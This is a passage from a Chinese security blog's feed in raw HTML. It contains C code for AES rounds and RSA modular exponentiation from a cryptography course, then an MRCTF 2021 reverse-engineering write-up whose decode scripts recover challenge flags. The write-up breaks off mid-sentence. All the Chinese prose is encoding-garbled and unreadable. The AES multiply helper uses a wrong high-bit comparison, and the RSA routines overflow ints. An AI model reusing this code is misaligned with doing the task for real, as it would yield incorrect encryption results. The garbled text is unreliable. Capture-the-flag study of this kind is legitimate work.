class="title">AddRoundKey_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> (*RoundKey_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">4</span> ;i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">0</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line">&#123;</span><br><span class="line">state_76[i_76][j_76] ^=  RoundKey_76[i_76][j_76];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShiftRows_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76, cnt_76, tmp_76;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">1</span>; i_76 &lt; <span class="number">4</span>; i_76++)</span><br><span class="line">&#123;</span><br><span class="line">cnt_76 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(cnt_76++ &lt; i_76)</span><br><span class="line">&#123;</span><br><span class="line">tmp_76 = state_76[i_76][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">1</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line">&#123;</span><br><span class="line">state_76[i_76][j_76<span class="number">-1</span>] = state_76[i_76][j_76];</span><br><span class="line">&#125;</span><br><span class="line">state_76[i_76][j_76<span class="number">-1</span>] = tmp_76;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">gfmultby_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> a_76, <span class="keyword">unsigned</span> <span class="keyword">char</span> b_76)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> tmp_76 = a_76 &gt; <span class="number">0x80</span> ? (<span class="keyword">unsigned</span> <span class="keyword">char</span>)((a_76&lt;&lt;<span class="number">1</span>)^<span class="number">0x1b</span>):(<span class="keyword">unsigned</span> <span class="keyword">char</span>)(a_76 &lt;&lt; <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(b_76 == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> a_76;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(b_76 == <span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> tmp_76;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> tmp_76^a_76;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mix_columns_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> (*output_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76, k_76;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">4</span>; i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">0</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(k_76 = <span class="number">0</span>; k_76 &lt; <span class="number">4</span>; k_76++)</span><br><span class="line">&#123;</span><br><span class="line">output_76[i_76][j_76] ^= gfmultby_76(state_76[k_76][j_76], mixValue_76[i_76][k_76]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="RSA-æ¨¡å¹‚è¿ç®—çš„å®ç°"><a href="#RSA-æ¨¡å¹‚è¿ç®—çš„å®ç°" class="headerlink" title="RSA æ¨¡å¹‚è¿ç®—çš„å®ç°"></a>RSA æ¨¡å¹‚è¿ç®—çš„å®ç°</h3><p>æŒ‰ç…§å¹³æ–¹ä¹˜ç®—æ³•å’Œæ¨¡é‡å¤å¹³æ–¹æ³•ï¼Œåˆ†åˆ«è®¡ç®—<strong>a^n mod n</strong></p><p><strong>1.å¹³æ–¹ä¹˜ç®—æ³•ã€‚</strong></p><p>è®¡ç®—æ•´ä½“æ€æƒ³ï¼šå…ˆå¹³æ–¹å†ä¹˜ã€‚</p><ul><li>å…ˆå°†æŒ‡æ•°è½¬åŒ–ä¸ºäºŒè¿›åˆ¶å½¢å¼ã€‚</li><li>ä»æŒ‡æ•°çš„äºŒè¿›åˆ¶é«˜ä½åˆ°ä½ä½ä¾æ¬¡è®¡ç®—ã€‚</li><li>åˆå§‹åŒ–è®¾ç½®ï¼Œ<strong>b1</strong> == 1 ,æ‰«æç¬¬ä¸€ä¸ªbitæ—¶ä¸éœ€è¦åšå…¶ä»–æ“ä½œã€‚</li><li>éšåè‹¥<strong>bi</strong> == 1ï¼Œåˆ™å¹³æ–¹ä¸Šä¸€æ¬¡çš„ç»“æœåå†ä¹˜xï¼ˆåº•æ•°ï¼‰ï¼›è‹¥<strong>bi</strong> == 0ï¼Œåªéœ€è¦å¯¹ä¸Šä¸€æ¬¡çš„ç»“æœå¹³æ–¹ä¸€æ¬¡å³å¯ã€‚</li></ul><p><strong>ç†è§£ï¼šä¸€æ¬¡å¹³æ–¹æ“ä½œä¼šè®©æŒ‡æ•°å‘å·¦ç§»ä¸€ä½ï¼Œå¹¶åœ¨æœ€å³è¾¹æ·»åŠ 0ï¼Œè€Œä¸xï¼ˆåº•æ•°ï¼‰ç›¸ä¹˜çš„æ“ä½œå³åœ¨æŒ‡æ•°çš„æœ€å³è¾¹ä½ç½®ä¸Šå¡«ä¸Š 1ï¼Œè¿™æ ·å®Œæˆåä¹Ÿæ˜¯å¾—åˆ°æŒ‡æ•°çš„äºŒè¿›åˆ¶ä½äº†ã€‚</strong></p><p>è¿™é‡Œè´´ä¸€ä¸‹ç½‘ä¸Šçœ‹åˆ°ä¸€å¼ å›¾ï¼š</p><p><img src="/2021/04/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A6/image-20210417144224324.png" alt="image-20210417144224324"></p><p>Cè¯­è¨€å®ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LRFun_76</span><span class="params">(<span class="keyword">int</span> a_76, <span class="keyword">int</span> m_76, <span class="keyword">int</span> n_76)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans_76 = <span class="number">1</span>, s_76[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, cnt_76 = <span class="number">0</span>, i_76 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(m_76)</span><br><span class="line">&#123;</span><br><span class="line">s_76[cnt_76++] = m_76&amp;<span class="number">1</span>;</span><br><span class="line">m_76 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(--cnt_76 &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">ans_76 = (ans_76*ans_76*(<span class="keyword">int</span>)<span class="built_in">pow</span>(a_76, s_76[cnt_76]))%n_76;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"i = %d, b = %d, ans_76 = ans_76*ans_76*a_76^%d(mod %d) = %d\n"</span>, i_76++, s_76[cnt_76], s_76[cnt_76], n_76, ans_76);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ç»“æœä¸ºï¼š%d\n"</span>, ans_76);</span><br><span class="line"><span class="keyword">return</span> ans_76;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.æ¨¡é‡å¤å¹³æ–¹æ³•ã€‚</strong></p><p>è®¡ç®—æ•´ä½“æ€æƒ³ï¼šå°†æŒ‡æ•°åˆ†ä¸ºå¤šä¸ª2æ¬¡æ–¹ç›¸åŠ çš„å½¢å¼ï¼Œç„¶åé‡å¤å¹³æ–¹ã€‚</p><p>ä¹Ÿæ˜¯å…ˆå°†æŒ‡æ•°è½¬åŒ–ä½äºŒè¿›åˆ¶çš„å½¢å¼ï¼Œç„¶åä»ä½ä½å¼€å§‹ï¼Œä¾æ¬¡è®¡ç®—ï¼Œä¸‹é¢çš„n1æ˜¯æ¯ä¸ªäºŒè¿›åˆ¶ä½ï¼Œè¡¨ç¤ºæ˜¯0æˆ–è€…1ã€‚</p><p><img src="/2021/04/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A6/image-20210417163737881.png" alt="image-20210417163737881"></p><p><strong>å…¶ä¸­çš„é‡å¤é‡å¤å¹³æ–¹æ˜¯æ¯è½®éƒ½è¦è¿›è¡Œçš„ï¼Œåªæ˜¯æ ¹æ®æŒ‡æ•°çš„äºŒè¿›åˆ¶ä½çš„0æ¥å†³å®šæ˜¯å¦å°†å…¶ä¹˜åˆ°ç»“æœä¸­å»ã€‚</strong></p><p>Cè¯­è¨€å®ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">powerMod_76</span><span class="params">(<span class="keyword">int</span> a_76, <span class="keyword">int</span> m_76, <span class="keyword">int</span> n_76)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans_76 = <span class="number">1</span>, s_76[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, i_76 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(; m_76; m_76 &gt;&gt;= <span class="number">1</span>, i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> tmp_76 = m_76&amp;<span class="number">1</span>;</span><br><span class="line">ans_76 = (ans_76*(<span class="keyword">int</span>)<span class="built_in">pow</span>(a_76, tmp_76))%n_76;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"i = %d: b = %d, ans_76 = ans_76*a_76^%d(mod %d) = %d\n"</span>, i_76, tmp_76, tmp_76, n_76, ans_76);</span><br><span class="line"></span><br><span class="line">a_76 = (a_76*a_76)%n_76;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"i = %d: a_76 = a_76*a_76(mod %d) = %d\n"</span>, i_76, n_76, a_76);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ç»“æœä¸ºï¼š%d\n"</span>, ans_76);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans_76;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œmainå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a_76, m_76, n_76;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ•°å­—ï¼ˆa, m, nï¼‰:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;a_76, &amp;m_76, &amp;n_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"ç”¨å¹³æ–¹ä¹˜ç®—æ³•çš„è®¡ç®—è¿‡ç¨‹ä¸ºï¼š"</span>);</span><br><span class="line">LRFun_76(a_76, m_76, n_76);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>), <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"ç”¨æ¨¡é‡å¤å¹³æ–¹æ³•çš„è®¡ç®—è¿‡ç¨‹ä¸ºï¼š"</span>);</span><br><span class="line">powerMod_76(a_76, m_76, n_76);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Course </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021MRCTF</title>
      <link href="/2021/04/12/2021MRCTF/"/>
      <url>/2021/04/12/2021MRCTF/</url>
      
        <content type="html"><![CDATA[<p>ä¸ªäººè§£é¢˜èµ›ï¼Œåšå®Œäº†é€†å‘é¢˜ï¼Œæ€»æ’åç¬¬5ã€‚<a id="more"></a></p><p><img src="https://i.loli.net/2021/04/12/51u7kH9FpMJdqsv.png" alt="image-20210412210153457"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Real-CHECKIN"><a href="#Real-CHECKIN" class="headerlink" title="Real_CHECKIN"></a>Real_CHECKIN</h3><p>æ¢è¡¨base64åŠ å¯†ï¼Œæ‰¾åˆ°è¡¨ï¼šabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/</p><p>å¯†æ–‡ï¼štvjdvez7D0vSyZbnzv90mf9nuKnurL8YBZiXiseHFq==</p><p>ç®€å•å†™ä¸€ä¸‹æ¢è¡¨è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"</span></span><br><span class="line">table = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line">enc = <span class="string">"tvjdvez7D0vSyZbnzv90mf9nuKnurL8YBZiXiseHFq=="</span></span><br><span class="line">ans = enc.translate(str.maketrans(table, s))</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(ans))</span><br><span class="line"></span><br><span class="line"><span class="comment">#MRCTF&#123;wElc0Me_t0_MRCTF_2o21!!!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Dynamic-Debug"><a href="#Dynamic-Debug" class="headerlink" title="Dynamic Debug"></a>Dynamic Debug</h3><p>æ¥åˆ°mainå‡½æ•°ï¼Œé¦–å…ˆå¯¹è¾“å…¥çš„å­—ç¬¦çš„é•¿åº¦è¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼š</p><p><img src="https://i.loli.net/2021/04/12/NRJXFg6s3hcDoEz.png" alt="image-20210411224811890"></p><p>åˆ°å…³é”®å‡½æ•°sub_402500ï¼ˆï¼‰ï¼Œä¸èƒ½ç›´æ¥åç¼–è¯‘ï¼Œé‚£å°±ç®€å•çš„åˆ†æä¸€ä¸‹æ±‡ç¼–ï¼Œå¼€å§‹æ˜¯èŠ±æŒ‡ä»¤ä¹‹ç±»çš„ä¸œè¥¿ï¼Œåé¢ä¹Ÿå°±æ˜¯ç®€å•æ¯”è¾ƒè¾“å…¥æ˜¯å¦ä¸ºï¼šMRCTF{IS_THIS_REAL?ASK_YOURSELF}ï¼Œå¾ˆæ˜æ˜¾è¿™æ˜¯å‡çš„ã€‚</p><p><img src="https://i.loli.net/2021/04/12/MYQAVZPiWKBgCzX.png" alt="image-20210411225042628"></p><p>è°ƒè¯•ä¸€æ³¢æ‰¾åˆ°å¯¹ä»£ç ä¿®æ”¹çš„åœ°æ–¹ï¼šå…¶å®ä¸å…³å¿ƒç»†èŠ‚ï¼Œç›´æ¥åŠ¨è°ƒè·Ÿè¿›æˆ‘ä»¬è¾“å…¥å­—ç¬¦åçš„å‡½æ•°ï¼Œç›´æ¥å°±æ˜¯è§£å¯†åçš„ä»£ç ï¼Œä¿®å¤ä¸€ä¸‹å³å¯ã€‚è¿™é‡Œæˆ‘åšé¢˜æ—¶idaå’ŒçŠ¯ç—…äº†ä¸€æ ·ï¼ŒåŠ¨è°ƒå¾—åˆ°é‚£ä¸ªè§£å¯†åçš„ä»£ç æ€ä¹ˆéƒ½ä¸å¯¹ï¼Œï¼Œåé¢å•æ­¥æ­¥å…¥æ‰¾åŸå› ï¼Œå†æ¬¡åˆ°è¾¾è§£å¯†åçš„ä»£ç åˆå¯¹äº†ï¼Œç°åœ¨æƒ³æ¨¡æ‹Ÿä¸€ä¸‹å½“æ—¶å‡ºé”™çš„æƒ…å†µï¼Œçœ‹åŸå› ï¼Œåˆä¸€ç›´ä¸é”™ï¼ˆã€‚ã€‚</p><p><img src="https://i.loli.net/2021/04/12/u2mL6S4ovfjPykR.png" alt="image-20210411225843676"></p><p>è¿™é‡Œæ‰‹åŠ¨patchä¸å¤ªæ–¹ä¾¿ï¼Œè¿˜è¦dumpå‡ºå¼‚æˆ–æµã€‚å°±ç›´æ¥åŠ¨è°ƒå¾—åˆ°ï¼Œä¸€ä¸ªæ¸…æ™°æ˜äº†çš„teaç»“æ„åŠ å¯†ï¼š</p><p><img src="https://i.loli.net/2021/04/12/AJnycbCNZvKH8kF.png" alt="image-20210411230306051"></p><p>è§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ENC[] = &#123;<span class="number">153</span>, <span class="number">161</span>, <span class="number">133</span>,  <span class="number">85</span>, <span class="number">104</span>,  <span class="number">93</span>, <span class="number">130</span>, <span class="number">126</span>,  <span class="number">57</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">77</span>, <span class="number">148</span>,  <span class="number">67</span>, <span class="number">105</span>, <span class="number">114</span>, <span class="number">113</span>,   <span class="number">6</span>,  <span class="number">67</span>,  <span class="number">81</span>, <span class="number">106</span>, </span><br><span class="line">    <span class="number">0</span>, <span class="number">173</span>,  <span class="number">20</span>,  <span class="number">75</span>,  <span class="number">63</span>,  <span class="number">13</span>, <span class="number">210</span>, <span class="number">100</span>,  <span class="number">21</span>, <span class="number">219</span>, </span><br><span class="line">   <span class="number">55</span>, <span class="number">159</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v5 = <span class="number">0x6B696C69</span>,</span><br><span class="line">     v4 = <span class="number">0x79645F65</span>,</span><br><span class="line">     v3 = <span class="number">0x696D616E</span>,</span><br><span class="line">     v2 = <span class="number">0x67626463</span>;</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">get_delat</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ans = <span class="number">0</span>, delat = <span class="number">0x9E3779B9</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">ans += delat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tea_decode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *enc = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ENC+<span class="number">8</span>*i);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> delat = get_delat();</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">31</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">enc[<span class="number">1</span>] -= (enc[<span class="number">0</span>] + delat) ^ (enc[<span class="number">0</span>]*<span class="number">16</span>+v3) ^ ((enc[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>)+v2);</span><br><span class="line">enc[<span class="number">0</span>] -= (enc[<span class="number">1</span>] + delat) ^ (enc[<span class="number">1</span>]*<span class="number">16</span>+v5) ^ ((enc[<span class="number">1</span>] &gt;&gt; <span class="number">5</span>)+v4);</span><br><span class="line">delat -= <span class="number">0x9E3779B9</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">tea_decode();</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, ENC[i]);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//MRCTF&#123;Dyn4m1c_d3buG_1s_a_ki11eR&#125;</span></span><br></pre></td></tr></table></figure><h3 id="MR-Register"><a href="#MR-Register" class="headerlink" title="MR_Register"></a>MR_Register</h3><p>è€ƒç‚¹ï¼šDebug BlockeræŠ€æœ¯ã€‚</p><p>ç¨‹åºçš„å…³é”®åœ¨å­è¿›ç¨‹ã€‚åˆ†ææ–¹æ³•å¾ˆå¤šï¼Œä½†ç»å¤§å¤šæ•°ï¼Œåªè¦æ‰¾åˆ°è¿™ä¸ªæŠ€æœ¯å…³é”®ç‚¹ï¼Œé™æ€åˆ†æå’ŒåŠ¨è°ƒçˆ¶è¿›ç¨‹çœ‹å­è¿›ç¨‹åé¦ˆå°±å¥½äº†ï¼Œå¦‚æœæ•°æ®å¤æ‚äº†ï¼Œå¯ä»¥é™„åŠ è°ƒè¯•çœ‹å†…å­˜åŠ ä»¥è¾…åŠ©ã€‚</p><p>é¦–å…ˆæ ¹æ®å‡½æ•°çš„ç‰¹å¾ç»“æ„æ‰¾åˆ°mainå‡½æ•°ï¼Œ</p><p><img src="https://i.loli.net/2021/04/12/RXUsE7vLtpea9gl.png" alt="image-20210411235747150"></p><p>æ¥çœ‹mainå‡½æ•°ï¼Œåˆšåˆšå¼€å§‹çœ‹çš„æ—¶å€™ç–‘æƒ‘äº†ä¸€ä¼šå„¿ï¼Œä¸ºä»€ä¹ˆè¿™ä¸ªåœ¨è°ƒè¯•çŠ¶æ€ä¸‹æ‰æ‰§è¡Œç¨‹åºçš„å…³é”®é€»è¾‘ï¼Œç»è¿‡åé¢çš„åˆ›å»ºè¿›ç¨‹å‡½æ•°å‘ç°ï¼šå…¶å®è¿™é‡Œçš„if elseè¯­å¥å°±åŒºåˆ«äº†çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹æ‰§è¡Œä¸åŒçš„è¯­å¥ï¼Œå› ä¸ºåˆ›å»ºå‡ºçš„å­è¿›ç¨‹æ˜¯è°ƒè¯•æ¨¡å¼è¿è¡Œçš„ã€‚è¿™é‡Œå…³æ³¨ä¸€ä¸‹åˆ›å»ºè¿›ç¨‹çš„<strong>dwCreationFlags</strong>å‚æ•°ï¼Œåˆ†æç¨‹åºæ˜¯å°†å…¶è½¬æ¢ä¸€ä¸‹æšä¸¾çš„å«ä¹‰å¥½çœ‹ä¸€äº›ã€‚</p><p><img src="https://i.loli.net/2021/04/12/2i1PyKHlcACXqog.png" alt="image-20210412111156696"></p><blockquote><p>dwCreationFlagsæ ‡è¯†äº†å½±å“æ–°è¿›ç¨‹åˆ›å»ºæ–¹å¼çš„æ ‡å¿—ï¼š</p><p><strong>DEBUG_PROCESSï¼šå¦‚æœè¿™ä¸ªæ ‡å¿—è¢«è®¾ç½®ï¼Œè°ƒç”¨è¿›ç¨‹å°†è¢«å½“ä½œä¸€ä¸ªè°ƒè¯•ç¨‹åºï¼Œå¹¶ä¸”æ–°è¿›ç¨‹ä¼šè¢«å½“ä½œè¢«è°ƒè¯•çš„è¿›ç¨‹ã€‚ç³»ç»ŸæŠŠè¢«è°ƒè¯•ç¨‹åºå‘ç”Ÿçš„æ‰€æœ‰è°ƒè¯•äº‹ä»¶é€šçŸ¥ç»™è°ƒè¯•å™¨ã€‚</strong></p><p><strong>DEBUG_ONLY_THIS_PROCESSï¼šå¦‚æœè¿™ä¸ªæ ‡å¿—è¢«è®¾ç½®ï¼Œè°ƒç”¨è¿›ç¨‹å°†è¢«å½“ä½œä¸€ä¸ªè°ƒè¯•ç¨‹åºï¼Œå¹¶ä¸”æ–°è¿›ç¨‹ä¼šè¢«å½“ä½œè¢«è°ƒè¯•çš„è¿›ç¨‹ã€‚ç³»ç»ŸæŠŠè¢«è°ƒè¯•ç¨‹åºå‘ç”Ÿçš„æ‰€æœ‰è°ƒè¯•äº‹ä»¶é€šçŸ¥ç»™è°ƒè¯•å™¨ã€‚</strong></p><p><strong>ä¸Šé¢2ä¸ªä¸åŒç‚¹åœ¨äºDEBUG_PROCESSä¼šè°ƒè¯•è¢«è°ƒè¯•è¿›ç¨‹ä»¥åŠå®ƒçš„æ‰€æœ‰å­è¿›ç¨‹ï¼Œè€ŒDEBUG_ONLY_THIS_PROCESSåªè°ƒè¯•è¢«è°ƒè¯•è¿›ç¨‹ï¼Œä¸è°ƒè¯•å®ƒçš„å­è¿›ç¨‹ã€‚</strong></p></blockquote><p>ç»§ç»­å°±æ˜¯åˆ†æåé¢çˆ¶è¿›ç¨‹å¤„ç†å­è¿›ç¨‹å¼‚å¸¸çš„éƒ¨åˆ†sub_40188D()ï¼š</p><p><img src="https://i.loli.net/2021/04/12/NsBlrSXueFjwH2C.png" alt="image-20210412111950176"></p><p>å…³é”®æ˜¯çœ‹DebugEvent.dwDebugEventCode == 